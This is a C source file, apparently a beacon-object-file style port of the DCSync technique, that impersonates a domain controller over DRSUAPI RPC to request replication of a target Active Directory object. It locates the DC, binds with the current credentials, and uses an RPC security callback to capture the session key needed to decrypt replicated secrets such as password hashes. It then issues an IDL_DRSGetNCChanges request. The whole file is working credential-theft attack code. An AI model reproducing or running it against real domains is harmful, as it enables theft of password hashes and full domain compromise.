#pragma once
#pragma comment(lib, "ntdsapi.lib")
#include <string.h>
#define SECURITY_WIN32

#include "dcsync.h"

#include "drsr/ms-drsr.h"
#include <stdio.h>

#include <DsGetDC.h>
#include <wchar.h>
#include <windows.h>

#include <lmcons.h>

#include <LMAPIbuf.h>
#include <NTSecAPI.h>
#include <rpcdcep.h>
#include <sspi.h>

#include <combaseapi.h>
#include <ole2.h>

#include <ntdsapi.h>

#include <DsGetDC.h>

#include <winldap.h>

#include <winber.h>

#include <secext.h>

#define MSVCRT$memcpy memcpy
#define RPCRT4$I_RpcBindingInqSecurityContext I_RpcBindingInqSecurityContext
#define RPCRT4$UuidCreate UuidCreate
#define MSVCRT$malloc malloc
#define MSVCRT$memset memset
#define MSVCRT$free free
#define RPCRT4$RpcStringBindingComposeA RpcStringBindingComposeA
#define RPCRT4$RpcBindingFromStringBindingA RpcBindingFromStringBindingA
#define RPCRT4$RpcStringFreeA RpcStringFreeA
#define RPCRT4$RpcBindingSetAuthInfoA RpcBindingSetAuthInfoA
#define RPCRT4$RpcBindingFree RpcBindingFree
#define RPCRT4$RpcBindingSetOption RpcBindingSetOption
#define KERNEL32Sleep Sleep
#define KERNEL32$MultiByteToWideChar MultiByteToWideChar
#define MSVCRT$strlen strlen
#define MSVCRT$_snprintf snprintf
#define MSVCRT$strcat strcat

static GUID domainGUID;

static BYTE g_SessionKeyCopy[256] = {0};
static DWORD g_SessionKeyCopyLen = 0;
static volatile LONG g_SessionKeyCapturing = 0;

void RPC_ENTRY RpcSecurityCallback(void *Context) {
  // Atomic check-and-set: only one thread can pass this
  if (InterlockedCompareExchange(&g_SessionKeyCapturing, 1, 0) != 0) {
    return; // Another thread is already capturing or has captured
  }

  PCtxtHandle pSecurityContext = NULL;
  SecPkgContext_SessionKey sessionKey = {0, NULL};

  if (RPCRT4$I_RpcBindingInqSecurityContext(
          Context, (void **)&pSecurityContext) != RPC_S_OK ||
      !pSecurityContext) {
    return;
  }

  if (QueryContextAttributesA(pSecurityContext, SECPKG_ATTR_SESSION_KEY,
                              &sessionKey) == SEC_E_OK &&
      sessionKey.SessionKeyLength > 0 && sessionKey.SessionKeyLength <= 256 &&
      sessionKey.SessionKey) {

    // Copy session key to static buffer
    MSVCRT$memcpy(g_SessionKeyCopy, sessionKey.SessionKey,
                  sessionKey.SessionKeyLength);
    g_SessionKeyCopyLen = sessionKey.SessionKeyLength;

    FreeContextBuffer(sessionKey.SessionKey);
  }
}

BOOL getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR *fullDCName) {
  BOOL status = FALSE;
  DWORD ret;
  PDOMAIN_CONTROLLER_INFOW cInfo = NULL;

  if (!fullDCName)
    return FALSE; // sanity check

  *fullDCName = NULL; // initialize to NULL

  ret = DsGetDcNameW(NULL, fullDomainName, NULL, NULL,
                     altFlags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
  if (ret == ERROR_SUCCESS) {
    // Skip the leading "\\"
    LPCWSTR dcNameSrc = cInfo->DomainControllerName + 2;

    size_t len = wcslen(dcNameSrc) + 1; // include null terminator
    *fullDCName = (LPWSTR)LocalAlloc(LPTR, len * sizeof(wchar_t));
    if (*fullDCName) {
      wcscpy_s(*fullDCName, len, dcNameSrc);
      status = TRUE;
    } else {
      wprintf(L"Memory allocation failed.\n");
    }

    NetApiBufferFree(cInfo);
  } else {
    wprintf(L"DsGetDcName failed: %u\n", ret);
  }

  return status;
}

DRS_HANDLE BindToDRS(RPC_BINDING_HANDLE rpcBinding) {
  DRS_HANDLE drsHandle = NULL;
  DRS_EXTENSIONS_INT *extClient = NULL;
  DRS_EXTENSIONS *extServer = NULL;
  UUID clientDsaUuid;
  ULONG result;

  // Generate a random client DSA UUID
  RPCRT4$UuidCreate(&clientDsaUuid);

  // Create DRS_EXTENSIONS_INT structure like mimikatz
  extClient = (DRS_EXTENSIONS_INT *)MSVCRT$malloc(sizeof(DRS_EXTENSIONS_INT));
  if (!extClient) {
    return NULL;
  }
  MSVCRT$memset(extClient, 0, sizeof(DRS_EXTENSIONS_INT));

  extClient->cb = sizeof(DRS_EXTENSIONS);
  extClient->dwFlags = 0x1FFFFFFF; // All modern capabilities
  extClient->Pid = 0;
  extClient->dwReplEpoch = 0;

  // Call IDL_DRSBind - using the Microsoft RPC stub
  result = IDL_DRSBind(rpcBinding, &clientDsaUuid, (DRS_EXTENSIONS *)extClient,
                       &extServer, &drsHandle);

  MSVCRT$free(extClient);
  MSVCRT$free(extServer);

  if (result != 0) {
    wprintf(L"[-] DRSBind failed: 0x%x\n", result);
    return NULL;
  }

  return drsHandle;
}

RPC_BINDING_HANDLE CreateDRSBinding(const char *dcHostname) {
  RPC_BINDING_HANDLE binding = NULL;
  unsigned char *stringBinding = NULL;
  RPC_STATUS status;

  // Build RPC string binding for DRSUAPI
  // Format: ncacn_ip_tcp:hostname[endpoint]
  status = RPCRT4$RpcStringBindingComposeA(
      NULL,                            // Object UUID
      (unsigned char *)"ncacn_ip_tcp", // Protocol sequence
      (unsigned char *)dcHostname,     // Network address
      NULL,                            // Use dynamic endpoint
      NULL,                            // No options
      &stringBinding);

  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to compose RPC string binding: 0x%x", status);
    return NULL;
  }

  // Create binding handle
  status = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &binding);
  RPCRT4$RpcStringFreeA(&stringBinding);

  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to create RPC binding: 0x%x", status);
    return NULL;
  }

  // Set authentication info (use Kerberos/NTLM via NEGOTIATE)
  // Use NULL for SPN to let RPC determine the correct service principal
  status = RPCRT4$RpcBindingSetAuthInfoA(binding,
                                         NULL, // Let RPC determine SPN
                                         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                         RPC_C_AUTHN_GSS_NEGOTIATE,
                                         NULL, // Use current credentials
                                         RPC_C_AUTHZ_NAME);

  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to set RPC auth info: 0x%x", status);
    RPCRT4$RpcBindingFree(&binding);
    return NULL;
  }

  // Register security callback to capture session key during authentication
  status = RPCRT4$RpcBindingSetOption(binding, RPC_C_OPT_SECURITY_CALLBACK,
                                      (ULONG_PTR)RpcSecurityCallback);
  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to set security callback: 0x%x", status);
    RPCRT4$RpcBindingFree(&binding);
    return NULL;
  }

  return binding;
}

void InitDRSRequest(DRS_MSG_GETCHGREQ *request, const GUID *dcGuid,
                    DSNAME *targetDsname) {
  if (!request) {
    // printf("no request found..\n");
    return;
  }

  MSVCRT$memset(request, 0, sizeof(DRS_MSG_GETCHGREQ));

  if (dcGuid) {
    // printf("copying GUID\n");
    MSVCRT$memcpy(&request->V8.uuidDsaObjDest, dcGuid, sizeof(GUID));
    // printf("copied GUID\n");
  }

  request->V8.pNC = targetDsname;
  MSVCRT$memset(&request->V8.uuidInvocIdSrc, 0, sizeof(UUID));
  MSVCRT$memset(&request->V8.usnvecFrom, 0, sizeof(USN_VECTOR));
  request->V8.pUpToDateVecDest = NULL;
  request->V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED |
                        DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
  // Maybe DRS_SPECIAL_SECRET_PROCESSING?
  request->V8.cMaxObjects = 1;
  request->V8.cMaxBytes = 0xA00000;
  request->V8.ulExtendedOp = EXOP_REPL_OBJ;
  MSVCRT$memset(&request->V8.liFsmoInfo, 0, sizeof(ULARGE_INTEGER));
  request->V8.pPartialAttrSet = NULL;
  request->V8.pPartialAttrSetEx = NULL;
  request->V8.PrefixTableDest.PrefixCount = 0;
  request->V8.PrefixTableDest.pPrefixEntry = NULL;
}

BOOL getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO *pDomainInfo) {
  BOOL status = FALSE;
  LSA_HANDLE hLSA;
  LSA_OBJECT_ATTRIBUTES oaLsa = {0};

  if (0 == LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)) {
    status = LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation,
                                       (PVOID *)pDomainInfo) == 0;
    LsaClose(hLSA);
  }

  return status;
}

wchar_t *CharToWChar(const char *str) {
  if (!str)
    return NULL;

  int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
  if (len == 0)
    return NULL;

  wchar_t *wstr = (wchar_t *)MSVCRT$malloc(len * sizeof(wchar_t));
  if (!wstr)
    return NULL;

  KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
  return wstr;
}

DSNAME *BuildDSName(const char *dn, const GUID *guid) {
  if (!dn)
    return NULL;

  size_t dnLen = MSVCRT$strlen(dn);
  if (dnLen > 4096)
    return NULL; // Sanity check
  wchar_t *wDn = CharToWChar(dn);
  if (!wDn)
    return NULL;

  size_t wDnLen = 0;
  while (wDn[wDnLen] != 0)
    wDnLen++;

  // Calculate structure size properly using FIELD_OFFSET
  // DSNAME has: structLen, SidLen, Guid, Sid (28 bytes), NameLen, StringName[1]
  // We need: base structure + space for (wDnLen) wide chars (StringName[1]
  // already counts for 1) NOTE: structLen should include the null terminator
  DWORD structLen =
      (DWORD)(sizeof(DSNAME) - sizeof(WCHAR) + ((wDnLen + 1) * sizeof(WCHAR)));

  DSNAME *dsname = (DSNAME *)MSVCRT$malloc(structLen);
  if (!dsname) {
    MSVCRT$free(wDn);
    return NULL;
  }

  MSVCRT$memset(dsname, 0, structLen);
  dsname->structLen = structLen;
  dsname->NameLen = (DWORD)wDnLen; // Length WITHOUT null terminator
  dsname->SidLen = 0;              // Not providing SID

  // Copy GUID if provided
  if (guid) {
    MSVCRT$memcpy(&dsname->Guid, guid, sizeof(GUID));
  } else {
    MSVCRT$memset(&dsname->Guid, 0, sizeof(GUID));
  }

  // Copy the wide string DN (including null terminator)
  for (size_t i = 0; i <= wDnLen; i++) { // <= to include null terminator
    dsname->StringName[i] = wDn[i];
  }

  MSVCRT$free(wDn);
  return dsname;
}

BOOL FetchGUID(LPWSTR DCName, GUID *DCGUID) {
  LDAP *pldap = NULL;
  pldap = ldap_initW(DCName,
                     389); // ldap_initW(const PWSTR HostName, ULONG PortNumber)
  if (pldap == NULL) {
    printf("might need to try ldaps?\n");
    pldap = ldap_initW(DCName, 636);
    if (pldap == NULL) {
      printf("failed to get upgraded connection. 0x%lx\n", GetLastError());
      return FALSE;
    }
  }
  ULONG err = ldap_bind_sW(pldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
  if (err != LDAP_SUCCESS) {
    printf("failed to bind: 0x%lx\n", err);
    return FALSE;
  }
  printf("got bind!!!\n");
  PDOMAIN_CONTROLLER_INFOW pDCInfo = NULL;
  DsGetDcNameW(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &pDCInfo);
  LDAPMessage *pResult = NULL;
  WCHAR szDN[1024];
  ULONG ulSize = sizeof(szDN) / sizeof(szDN[0]);
  GetComputerObjectNameW(NameFullyQualifiedDN, szDN, &ulSize);
  wprintf(L"DC DN: %s\n", szDN);
  ULONG ret;
  WCHAR *attrs[] = {L"objectGUID", NULL};
  ret = ldap_search_sW(pldap, szDN, LDAP_SCOPE_SUBTREE, L"(objectClass=*)",
                       attrs, 0, &pResult);
  if (ret != LDAP_SUCCESS) {
    printf("failed: 0x%lx\n", ret);
    return FALSE;
  }
  LDAPMessage *entry = ldap_first_entry(pldap, pResult);
  if (entry) {
    struct berval **guidVals =
        ldap_get_values_lenW(pldap, entry, L"objectGUID");
    if (guidVals && guidVals[0]) {
      memcpy(DCGUID, guidVals[0]->bv_val, sizeof(GUID));
      // Convert to string
      // LPOLESTR guidString;
      // StringFromCLSID(DCGUID, &guidString);
      // wprintf(L"Computer objectGUID: %s\n", guidString);
      return TRUE;
    }
  }

  return TRUE;
}

void DCSync(char *DN, char *objGuid) {

  LPWSTR szDomain = NULL, szDc = NULL, szService = NULL;
  DSNAME dsName = {0};
  LPDWORD pMajor, pMinor, pBuild;
  PPOLICY_DNS_DOMAIN_INFO DomainInfo = NULL;
  DRS_HANDLE drsHandleBind, drsHandle;
  DSNAME *targetDsname = NULL;

  // get Domain
  getCurrentDomainInfo(&DomainInfo);
  szDomain = DomainInfo->DnsDomainName.Buffer;
  wprintf(L"Domain would be %s\n", szDomain);
  //
  //
  // get DC
  getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szDc);
  wprintf(L"DC: %s\n", szDc);
  char dc[256];
  wcstombs(dc, szDc, sizeof(dc)); // convert wide string to ANSI
  // char *dc = (char *)szDc;
  printf("%s\n", dc);
  // make bind
  drsHandleBind = CreateDRSBinding(dc);
  if (drsHandleBind == NULL) {
    printf("failed to make drsHandle binding\n");
    return;
  }
  printf("made drs handle binding!!\n");

  drsHandle = BindToDRS(drsHandleBind);
  if (drsHandle == NULL) {
    printf("failed to bind\n");
    return;
  }
  printf("got bind!\n");
  KERNEL32Sleep(100);
  BYTE *sessionKey = NULL;
  DWORD sessionKeyLen = 0;
  GUID guid_s;
  WCHAR wGuid[40];
  MultiByteToWideChar(CP_ACP, 0, objGuid, -1, wGuid, 40);
  CLSIDFromString(wGuid, &guid_s);

  // build DS name
  targetDsname = BuildDSName(DN, &guid_s);
  wprintf(L"targeting: %s\n", targetDsname->StringName);

  // get DC GUID
  printf("getting DC guid..\n");
  GUID DCGuid = {0};
  FetchGUID(szDc, &DCGuid);
  LPOLESTR guidString;
  StringFromCLSID(&DCGuid, &guidString);
  wprintf(L"GUID: %s\n", guidString);

  // prep request
  DRS_MSG_GETCHGREQ request = {0};
  InitDRSRequest(&request, &DCGuid, targetDsname);

  if (request.V8.PrefixTableDest.pPrefixEntry) {
    for (DWORD i = 0; i < request.V8.PrefixTableDest.PrefixCount && i < 15;
         i++) {
      char oidHex[128] = {0};
      for (DWORD j = 0;
           j < request.V8.PrefixTableDest.pPrefixEntry[i].prefix.length &&
           j < 16;
           j++) {
        char byte[8];
        MSVCRT$_snprintf(
            byte, sizeof(byte), "%02X ",
            request.V8.PrefixTableDest.pPrefixEntry[i].prefix.elements[j]);
        MSVCRT$strcat(oidHex, byte);
      }
    }
  }
  printf("init DS Get changes request!!\n");
  DWORD outVersion = 0;
  DRS_MSG_GETCHGREPLY reply;
  MSVCRT$memset(&reply, 0, sizeof(reply));
  ULONG result =
      IDL_DRSGetNCChanges(drsHandle, 8, &request, &outVersion, &reply);
  wprintf(L"result of request: 0x%lx\n", result);

  return;
}
